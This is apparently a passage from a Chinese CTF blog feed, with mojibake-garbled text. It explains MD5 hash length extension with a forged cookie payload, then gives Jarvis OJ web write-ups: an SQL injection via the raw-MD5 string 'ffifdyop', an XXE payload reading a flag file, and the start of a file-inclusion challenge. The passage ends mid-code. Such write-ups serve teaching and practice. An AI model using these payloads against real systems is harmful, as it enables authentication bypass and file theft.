d41d8cd98f00b204e9800998ecf8427e</span><br></pre></td></tr></table></figure></p><p>MD5ç®—æ³•åŒ…æ‹¬å‡ ä¸ªæ­¥éª¤ï¼š1. è¡¥ä½ï¼›2. è¡¥é•¿åº¦ï¼›3. åˆå§‹åŒ–MDç¼“å†²åŒºï¼›4. å¤„ç†å­—å—æ¶ˆæ¯ã€‚å®ƒä»¥512bitä¸ºä¸€ä¸ªå—è¿›è¡Œè¿­ä»£è¿ç®—ï¼Œç¬¬ä¸€ä¸ªå—è®¡ç®—å®Œæˆåå››ä¸ªå¯„å­˜å™¨çš„å€¼å°±ä¼šæ›´æ–°ï¼Œå¦‚æœè¿˜å­˜åœ¨ä¸‹ä¸€ä¸ªå—ï¼Œå°±åœ¨æ­¤åŸºç¡€ä¸Šç»§ç»­è¿›è¡Œè¿­ä»£è®¡ç®—ï¼Œå…¨éƒ¨å®Œæˆåï¼ŒæŠŠå››ä¸ªå¯„å­˜å™¨ä¸­çš„åå…­è¿›åˆ¶è¿æ¥èµ·æ¥ï¼Œå°±æ˜¯æœ€åçš„md5å€¼ã€‚ç®€å•è®²ä¸€ä¸‹è¿™å‡ ä¸ªæ­¥éª¤ï¼š</p><p>1 - è¡¥ä½<br>å¦‚æœå½“å‰çš„æ•°æ®é•¿åº¦ä¸æ»¡è¶³å¯¹ 512bit æ±‚ä½™ä¸º 448bit ï¼Œå³len(message) % 512 != 448æ—¶ï¼Œéœ€è¦è¡¥ä½è‡³æ»¡è¶³è¿™ä¸ªæ¡ä»¶ã€‚<br>è¡¥ä½æ–¹å¼ï¼š</p><ol><li>é¦–å…ˆè¡¥ä¸€ä¸ª1ï¼ˆäºŒè¿›åˆ¶ä½ä¸Šçš„1ï¼Œè€Œéåè¿›åˆ¶ä½ä¸Šçš„ï¼‰</li><li>åœ¨åé¢è¡¥0ï¼ˆä¹Ÿæ˜¯äºŒè¿›åˆ¶ä½ä¸Šçš„ï¼‰ï¼Œç›´åˆ°æ»¡è¶³æ¡ä»¶ï¼ˆæ•°æ®æ¯”ç‰¹é•¿åº¦å¯¹ 512 æ±‚ä½™ä¸º 448ï¼‰</li></ol><p>æ³¨æ„ï¼Œå¦‚æœæ¶ˆæ¯é•¿åº¦å·²ç»è¾¾åˆ° 448bit ï¼Œä¹Ÿè¦è¿›è¡Œè¡¥ä½ï¼Œè¡¥ä½æ˜¯å¿…é¡»çš„ã€‚</p><p>2 - è¡¥é•¿åº¦<br>å³è¡¥ 64bit çš„é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦æ˜¯åœ¨è¡¥ 1 å’Œ 0 ä»¥å‰çš„é•¿åº¦ï¼Œå¦‚æœé•¿åº¦è¶…å‡ºäº† 64bitï¼Œé‚£ä¹ˆå°±å–ä½ 64bitã€‚</p><p>å¼•ç”¨ä¸€ä¸‹<a href="https://lightless.me/archives/hash-extender-attack.html" target="_blank" rel="noopener">lightless</a>æ–‡ç« é‡Œçš„è¯´æ³•ã€‚å®Œæˆè¡¥ä½ä¸è¡¥é•¿åº¦çš„æ“ä½œåï¼Œä¸€ä¸ªå—å¯èƒ½æ˜¯è¿™ä¸ªæ ·å­çš„ï¼š<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw_data + '\<span class="keyword">x</span><span class="number">80</span>' + '\<span class="keyword">x</span><span class="number">00</span>'*n + '\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>\<span class="keyword">x</span><span class="number">00</span>'</span><br></pre></td></tr></table></figure></p><p>ç¬¬ä¸€ä¸ª raw_data çš„éƒ¨åˆ†å°±æ˜¯åŸå§‹çš„æ•°æ®ï¼Œç¬¬äºŒä¸ªéƒ¨åˆ†â€™\x80â€™æ˜¯ä¸€å¼€å§‹è¡¥çš„ä¸€ä¸ªäºŒè¿›åˆ¶ä½ 1ï¼Œæ¥ç€è¡¥è‹¥å¹²ä¸ª \ x00ï¼Œç›´åˆ°æ•´ä¸ªé•¿åº¦è¾¾åˆ° 56Byteï¼Œæœ€åçš„ 8Byte å°±æ˜¯ raw_data çš„é•¿åº¦ï¼Œå¦‚æœ raw_data çš„é•¿åº¦è¶…è¿‡äº† 2^64bitï¼Œåˆ™å–ä½ 64bit.</p><blockquote><p>é™„1ï¼Œ2æ­¥çš„æ–‡æ¡£ä»‹ç»</p><p> Step 1. Append Padding Bits</p><p> The message is â€œpaddedâ€ (extended) so that its length (in bits) is<br> congruent to 448, modulo 512. That is, the message is extended so<br> that it is just 64 bits shy of being a multiple of 512 bits long.<br> Padding is always performed, even if the length of the message is<br> already congruent to 448, modulo 512.</p><p> Padding is performed as follows: a single â€œ1â€ bit is appended to the<br> message, and then â€œ0â€ bits are appended so that the length in bits of<br> the padded message becomes congruent to 448, modulo 512. In all, at<br> least one bit and at most 512 bits are appended.</p><p> Step 2. Append Length</p><p> A 64-bit representation of b (the length of the message before the<br> padding bits were added) is appended to the result of the previous<br> step. In the unlikely event that b is greater than 2^64, then only<br> the low-order 64 bits of b are used. (These bits are appended as two<br> 32-bit words and appended low-order word first in accordance with the<br> previous conventions.)</p><p> At this point the resulting message (after padding with bits and with<br> b) has a length that is an exact multiple of 512 bits. Equivalently,<br> this message has a length that is an exact multiple of 16 (32-bit)<br> words. Let M[0 â€¦ N-1] denote the words of the resulting message,<br> where N is a multiple of 16.</p></blockquote><p>3 - åˆå§‹åŒ–MDç¼“å†²åŒº<br>åœ¨è®¡ç®—md5çš„æ—¶å€™ä¼šå…ˆåˆå§‹åŒ–å››ä¸ªå¯„å­˜å™¨ï¼ˆAï¼ŒBï¼ŒCï¼ŒDï¼‰ä¸”æœ‰å„è‡ªçš„åˆå§‹å€¼ï¼š<br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">word A:<span class="number"> 01 </span>23<span class="number"> 45 </span>67</span><br><span class="line">word B:<span class="number"> 89 </span>ab cd ef</span><br><span class="line">word C: fe dc ba 98</span><br><span class="line">word D:<span class="number"> 76 </span>54<span class="number"> 32 </span>10</span><br></pre></td></tr></table></figure></p><p>4 - å¤„ç†å­—å—æ¶ˆæ¯<br>å¿…é¡»ç”¨å·²ç»å®Œæˆè¡¥ä½ &amp; è¡¥é•¿åº¦æ“ä½œçš„å­—å—æ¥è¿›è¡Œè¿ç®—ï¼Œå…·ä½“ç»†èŠ‚ä¸å±•å¼€äº†ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ç»è¿‡ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦åï¼Œä¸Šé¢çš„å¯„å­˜å™¨å€¼å°†ä¼šè¢«æ–°çš„å€¼è¦†ç›–ï¼Œè€Œæœ€åä¸€è½®äº§ç”Ÿçš„é“¾å˜é‡ç»è¿‡é«˜ä½ä½äº’æ¢ï¼ˆå¦‚ï¼šaabbccdd -&gt; ddccbbaaï¼‰åå°±æ˜¯æˆ‘ä»¬è®¡ç®—å‡ºæ¥çš„ md5 å€¼ã€‚</p><p><strong>ä¸¾ä¸ªæ —å­ğŸŒ°</strong></p><ol><li><p>å‡è®¾å¾…åŠ å¯†çš„å­—ç¬¦ä¸²ä¸º <code>abc</code> </p></li><li><p>æŠŠå­—ç¬¦ä¸²è½¬åŒ–ä¸º16è¿›åˆ¶å½¢å¼ - <code>616263</code><br><img src="/posts/hash-extender-attack/1.png" alt=""></p></li><li><p>è¡¥ä½ã€‚å³åœ¨äºŒè¿›åˆ¶å½¢å¼çš„ä¿¡æ¯åé¢å…ˆæ·»ä¸€ä¸ª <code>1</code> ï¼Œç„¶åæ¥è‹¥å¹²ä¸ª <code>0</code> ç›´åˆ°æ»¡è¶³ len(message) % 512 == 448 è¿™ä¸€æ¡ä»¶ã€‚16è¿›åˆ¶ä¸‹æˆ‘ä»¬åœ¨ <code>616263</code> ååŠ ä¸€ä¸ª <code>80</code> ï¼ˆå³äºŒè¿›åˆ¶çš„ <code>10000000</code> ï¼‰ï¼ŒæŠŠå®ƒæŒ‰ç…§è§„åˆ™è¡¥ä½åˆ° 448 bit ï¼Œä¹Ÿå°±æ˜¯56å­—èŠ‚ã€‚<br><img src="/posts/hash-extender-attack/2.png" alt=""></p></li><li><p>è¡¥é•¿åº¦ã€‚å®Œæˆè¡¥ä½åï¼Œç¬¬ 57 ä¸ªå­—èŠ‚å­˜å‚¨çš„æ˜¯è¡¥ä½ä¹‹å‰ä¿¡æ¯çš„é•¿åº¦ã€‚åŸæ¥çš„ä¿¡æ¯ä¸º <code>abc</code> ï¼Œ3ä¸ªå­—ç¬¦ï¼Œ3ä¸ªå­—èŠ‚ï¼Œ24 bitï¼Œæ¢æˆ16è¿›åˆ¶åä¸º 0x18 ï¼Œå…¶åè¡¥å……7ä¸ª 0x00 ä»¥è¡¥æ»¡ 64 å­—èŠ‚ã€‚<br><img src="/posts/hash-extender-attack/3.png" alt=""></p></li><li><p>åˆ©ç”¨å®Œæˆå‰å‡ æ­¥è¡¥è¶³æ“ä½œçš„æ•°æ®è¿›è¡Œå¤æ‚è¿ç®—ã€‚å–å‡º 64 å­—èŠ‚ä¿¡æ¯ï¼Œç¬¬ä¸€è½®è¿ç®—ä¸­ä½¿ç”¨çš„é“¾å˜é‡ä¸ºåˆå§‹é“¾å˜é‡ï¼Œä¹‹åæ¯ä¸€æ¬¡è¿ç®—é“¾å˜é‡éƒ½ä¼šè¢«è¦†ç›–æ›´æ–°ï¼Œæœ€åä¸€è½®è¿ç®—äº§ç”Ÿçš„é“¾å˜é‡ç»è¿‡é«˜ä½ä½äº’æ¢åå°±æ˜¯æˆ‘ä»¬å¾—åˆ°çš„ MD5 å€¼ã€‚</p></li></ol><h2 id="0x02-å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#0x02-å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="0x02 å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"></a>0x02 å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</h2><p>MD5çš„è¡¥ä½æ“ä½œæ­£æ˜¯å®ç°é•¿åº¦æ‰©å±•æ”»å‡»çš„å…³é”®ã€‚</p><p>æˆ‘ä»¬è™½ç„¶ä¸çŸ¥é“å…·ä½“çš„ salt å€¼ï¼Œä½†å¦‚æœæˆ‘ä»¬å¾—åˆ°äº†å…¶ hash å€¼ä»¥åŠä¸€ä¸ªå¯æ§çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™äº›ç‚¹è¿›è¡Œå“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ã€‚æˆ‘ä»¬å¾—åˆ°çš„ hash å€¼æ­£æ˜¯æœ€åä¸€è½®è¿ç®—äº§ç”Ÿçš„é“¾å˜é‡ç»è¿‡é«˜ä½ä½äº’æ¢åå¾—åˆ°çš„ç»“æœï¼Œå¦‚æœæˆ‘ä»¬è¦æŠŠå¯æ§çš„ä¿¡æ¯è¿›è¡Œä¸‹ä¸€è½®è¿ç®—ï¼Œåªéœ€è¦çŸ¥é“ä¸Šä¸€è½®ä¿¡æ¯äº§ç”Ÿçš„é“¾å˜é‡ã€‚</p><p>å›åˆ°å¼€å¤´è´´çš„é‚£ä»½ä»£ç ï¼Œå…³é”®è¯­å¥ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($role===<span class="string">"admin"</span> &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[<span class="string">"role"</span>]))) &#123;    </span><br><span class="line">            $auth = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>ç®€å•è¯´ä¸€ä¸‹æ€è·¯ï¼šæˆ‘ä»¬å¯ä»¥ä» cookie é‡Œæ‹¿åˆ°ä¸€æ®µå·²çŸ¥çš„ hash ï¼Œæˆ‘ä»¬ä¹ŸçŸ¥é“éœ€è¦æ ¡éªŒçš„å†…å®¹ï¼ˆ admin ï¼‰ï¼Œsalt ä¸å…¶é•¿åº¦æ˜¯æœªçŸ¥çš„ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»æ¥æ„é€ ä¸€æ®µæƒ³åˆ©ç”¨çš„æ ¡éªŒå†…å®¹ï¼Œå³ä½¿ä¸çŸ¥é“ salt ä¹Ÿå¯ä»¥å¾—å‡ºå®ƒçš„ hash å€¼ã€‚</p><p>å…ˆå°†æ˜æ–‡è¿›è¡Œåˆ†ç»„ä¸å¡«å……ï¼Œåœ¨å…¶åæ·»åŠ æˆ‘ä»¬æƒ³è¦å¢åŠ çš„æ–°å†…å®¹ï¼Œå³æ–°çš„æ ¡éªŒå†…å®¹ï¼Œç„¶åæˆ‘ä»¬æŠŠåŸæ¥å¾—åˆ°çš„ hash å€¼é€†ä¸º key å€¼ï¼ˆæ³¨æ„ md5 ä¸­çš„å€¼éƒ½æ˜¯å°ç«¯çš„ï¼‰ï¼Œæ ¹æ® MD5 åŠ å¯†åŸç†ï¼Œæˆ‘ä»¬å·²ç»å¾—åˆ°äº† key ï¼Œå°±å¯ä»¥å¾—å‡ºä¸‹ä¸€è½®çš„ hash å€¼äº†ï¼ˆä¾‹å¦‚æ­¤å¤„çš„ admin çš„ hash å€¼ã€‚ï¼‰</p><p>å› ä¸ºè¿™ä¸ªé¢˜é‡Œè¿˜æœ‰ä¸€ä¸ª strrev å‡½æ•°ï¼ˆå­—ç¬¦ä¸²åè½¬ï¼‰ï¼Œæ„é€ å¦‚ä¸‹ payloadï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">åŸæ ¡éªŒçš„å†…å®¹ï¼š;"<span class="selector-tag">tseug</span>"<span class="selector-pseudo">:5</span><span class="selector-pseudo">:s</span></span><br><span class="line">æ–°æ·»åŠ çš„å†…å®¹ï¼š;"<span class="selector-tag">nimda</span>"<span class="selector-pseudo">:5</span><span class="selector-pseudo">:s</span></span><br><span class="line">åŸ<span class="selector-tag">hash</span>å€¼ï¼š3<span class="selector-tag">a4727d57463f122833d9e732f94e4e0</span></span><br><span class="line"><span class="selector-tag">salt</span> é•¿åº¦æœªçŸ¥ï¼Œéœ€è¦è¿›è¡Œçˆ†ç ´</span><br></pre></td></tr></table></figure><p>ä¹‹å‰çš„ wp é‡Œç”¨çš„æ˜¯ hash_extender è¿™ä¸ªå·¥å…·ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯ hashpump ã€‚<br><img src="/posts/hash-extender-attack/4.png" alt=""></p><p>æŠŠ <code>\x</code> éƒ½æ¢æˆ <code>%</code> ï¼Œå¯ä»¥å¾—åˆ°</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">role = s<span class="symbol">%3</span>a<span class="number">5</span><span class="symbol">%3</span>a<span class="string">"admin"</span><span class="symbol">%3</span>b<span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%c0</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%80</span>s<span class="symbol">%3</span>a<span class="number">5</span><span class="symbol">%3</span>a<span class="string">"guest"</span><span class="symbol">%3</span>b</span><br><span class="line">hsh = fcdc<span class="number">3840332555511</span><span class="keyword">c</span><span class="number">4e4323</span>f<span class="number">6</span>decb<span class="number">07</span></span><br></pre></td></tr></table></figure><p>æœ€åä¿®æ”¹ä¸€ä¸‹Cookieå¾—åˆ°flagã€‚<br><img src="/posts/hash-extender-attack/5.png" alt=""></p><p>ä¿®å¤æ–¹æ³•ï¼šç”¨ hash($SECRET, hash($message)) çš„æ–¹å¼ï¼Œè¿™æ ·ç”¨æˆ·å°±ä¸å¯æ§ message äº†ï¼Œå¦å¤–ä½¿ç”¨ HMAC ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åˆ©ç”¨äº† MD5 ï¼ŒSHA1 ç­‰åŠ å¯†ç®—æ³•çš„ç¼ºé™·ï¼Œå¯ä»¥åœ¨ä¸çŸ¥é“åŸå§‹å¯†é’¥çš„æƒ…å†µä¸‹è®¡ç®—å‡ºä¸€ä¸ªå¯¹åº”çš„ hash å€¼ã€‚&lt;/p&gt;
    
    </summary>
    
      <category term="Crypto" scheme="https://cyris.pen.moe/categories/Crypto/"/>
    
    
      <category term="CRYPTO" scheme="https://cyris.pen.moe/tags/CRYPTO/"/>
    
      <category term="CTF" scheme="https://cyris.pen.moe/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ Writeup</title>
    <link href="https://cyris.pen.moe/posts/jarvisoj-wp/"/>
    <id>https://cyris.pen.moe/posts/jarvisoj-wp/</id>
    <published>2017-11-04T03:23:21.000Z</published>
    <updated>2018-04-01T06:23:49.000Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€äº› Jarvis OJ ä¸Šçš„é¢˜ã€‚</p><p>å¹³å°åœ°å€ï¼š<a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></p><a id="more"></a> <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>éœ€è¦å¯†ç æ‰èƒ½è·å¾—flagå“¦ã€‚     </p><p>é¢˜ç›®å…¥å£ï¼š<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p><p>åœ¨ Headers é‡Œæ‰¾åˆ°ä¸€æ¡hintï¼š  </p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint:"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure><p>æ¶‰åŠåˆ°ä¸€ä¸ªMD5åŠ å¯†åçš„æ³¨å…¥é—®é¢˜ã€‚    </p><p>å…³äºè¿™æ¡md5è¯­å¥æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹phpæ‰‹å†Œä¸­çš„æè¿°ï¼š</p><blockquote><p><strong>Description</strong></p><p>string md5 ( string str [, bool raw_output] )</p><p>Calculates the MD5 hash of str using the RSA Data Security, Inc. MD5 Message-Digest Algorithm, and returns that hash. The hash is a 32-character hexadecimal number. If the optional raw_output is set to TRUE, then the md5 digest is instead returned in raw binary format with a length of 16.</p><p>æ³¨: The optional raw_output parameter was added in PHP 5.0.0 and defaults to FALSE</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœmd5åçš„hexè½¬æ¢æˆå­—ç¬¦ä¸²åï¼Œè‹¥åŒ…å« <code>&#39;or&#39;&lt;trash&gt;</code> è¿™æ ·çš„å­—ç¬¦ä¸²ï¼Œé‚£æ•´ä¸ªsqlè¯­å¥å°±ä¼šå˜æˆï¼š   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM admin WHERE <span class="keyword">pass</span> = <span class="string">''</span>o<span class="string">r'&lt;trash&gt;'</span></span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº†ã€‚   </p><p>ç½‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š<code>ffifdyop</code></p><p>md5ä»¥åï¼š<code>276f722736c95d99e921722cf9ed621c</code></p><p>å†è½¬æ¢æˆå­—ç¬¦ä¸²å³ä¸º<code>&#39;or&#39;&lt;trash&gt;</code>  </p><p>æŠŠä¸Šé¢è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸º password ä¼ å…¥å³å¯ã€‚  </p><hr><h3 id="apiè°ƒç”¨"><a href="#apiè°ƒç”¨" class="headerlink" title="apiè°ƒç”¨"></a>apiè°ƒç”¨</h3><p>è¯·è®¾æ³•è·å¾—ç›®æ ‡æœºå™¨/home/ctf/flag.txtä¸­çš„flagå€¼ã€‚</p><p>é¢˜ç›®å…¥å£ï¼š<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p><p>ç›´æ¥èƒ½çœ‹åˆ°æºç ï¼š<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p><p>å…‰çœ‹è¿™ä¸ªæ²¡æ‰¾åˆ°ä»€ä¹ˆç‰¹åˆ«çš„ä¸œè¥¿ï¼Œæœäº†ä¸€äº›èµ„æ–™å‘ç°è¿™é¢˜æ˜¯å…³äº <a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">XXEæ¼æ´</a> ï¼Œç®€å•åœ°è¯´å°±æ˜¯åˆ©ç”¨ <code>xml</code> ä¸­çš„ <code>Entity</code> å®ä½“æ¥è¯»å–æ–‡ä»¶æˆ–è€…æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ç­‰ï¼Œä»¥é€ æˆæ”»å‡»ã€‚  </p><p>è¿™é¢˜é‡Œå…ˆæŠŠ <code>Content-Type</code> æ”¹æˆ <code>application/xml</code>ï¼Œç„¶åæ„é€ ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xdsec [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT methodname ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "/home/ctf/flag.txt" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodcall</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">methodname</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">methodname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodcall</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥è·å–flagäº†ã€‚</p><hr><h3 id="ç¥ç›¾å±€çš„ç§˜å¯†"><a href="#ç¥ç›¾å±€çš„ç§˜å¯†" class="headerlink" title="ç¥ç›¾å±€çš„ç§˜å¯†"></a>ç¥ç›¾å±€çš„ç§˜å¯†</h3><p>è¿™é‡Œæœ‰ä¸ªé€šå‘ç¥ç›¾å±€å†…éƒ¨ç½‘ç»œçš„ç§˜å¯†å…¥å£ï¼Œä½ èƒ½é€šè¿‡æ¼æ´å‘ç°ç¥ç›¾å±€çš„ç§˜å¯†å—ï¼Ÿ</p><p>é¢˜ç›®å…¥å£ï¼š<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p><p>æ‰«äº†ä¸€ä¸‹ç›®å½•ï¼Œåªå‘ç°äº† <code>showing.php</code> å’Œ <code>index.php</code>ã€‚</p><p>æŸ¥çœ‹æºç å‘ç°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"showimg.php?img=c2hpZWxkLmpwZw=="</span> <span class="attr">width</span>=<span class="string">"100%"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ„Ÿè§‰åƒæ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯ç°åœ¨é™¤äº†è¿™å¼ å›¾å¤–æ²¡æœ‰åˆ«çš„èƒ½åˆ©ç”¨çš„ä¸œè¥¿ï¼Œè¯•ç€è¯»å– <code>showing.php</code> æœ¬èº«ï¼š</p><p><img src="/posts/jarvisoj-wp/1.png" alt=""></p><p>å¯ä»¥çœ‹åˆ°æºç ï¼Œè¿‡æ»¤äº† <code>pctf</code> ã€‚ä½†æ˜¯æ²¡ä»€ä¹ˆåˆ©ç”¨æ–¹å¼ï¼Œå¦‚æœç›´æ¥æŸ¥çœ‹ <code>/pctf.php</code> æ‹¿åˆ°çš„æ˜¯å‡flagã€‚åŒæ ·çš„æ–¹å¼è¯»å– <code>index.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">    $x = <span class="keyword">new</span> Shield();</span><br><span class="line">    <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">        $x = 